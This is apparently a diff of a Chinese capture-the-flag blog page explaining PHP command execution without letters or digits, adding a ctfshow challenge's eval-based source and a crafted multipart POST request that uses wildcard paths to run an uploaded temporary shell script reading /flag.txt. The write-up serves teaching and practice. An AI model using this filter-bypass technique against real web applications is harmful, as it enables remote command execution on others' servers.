@@ -682,9 +682,40 @@ if(isset($_GET['code'])){
 </ol>
 <p>上传临时文件</p>
 <p>具体原理看p神博客<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ethan552525/article/details/118459568?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164787068316780261974367%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164787068316780261974367&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-118459568.142">https://blog.csdn.net/Ethan552525/article/details/118459568?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164787068316780261974367%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164787068316780261974367&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-118459568.142</a> 具体看列题</p>
-<pre class="line-numbers language-none"><code class="language-none">?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>例子：ctfshow web 红包题第二弹</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+        if(isset($_GET['cmd'])){
+            $cmd=$_GET['cmd'];
+            highlight_file(__FILE__);
+            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
+            
+                die("cerror");
+            }
+            if(preg_match("/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
+                die("serror");
+            }
+            eval($cmd);
+        
+        }
+    
+     ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>第一步： post burpsute抓包<br>修改请求头</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
+...
+
+Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
+Content-Length: 256  (数字随便填浏览器会自动补对 下面必须空行)
+
+-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
+
+#! /bin/sh
+
+cat /flag.txt
+-----------------------------10242300956292313528205888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220322151538855.png" alt="image-20220322151538855"></p>
 
                 
             </div>
@@ -1212,7 +1243,7 @@ if(isset($_GET['code'])){
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">18.3k</span>
+                        class="white-color">18.4k</span>
             
             
             
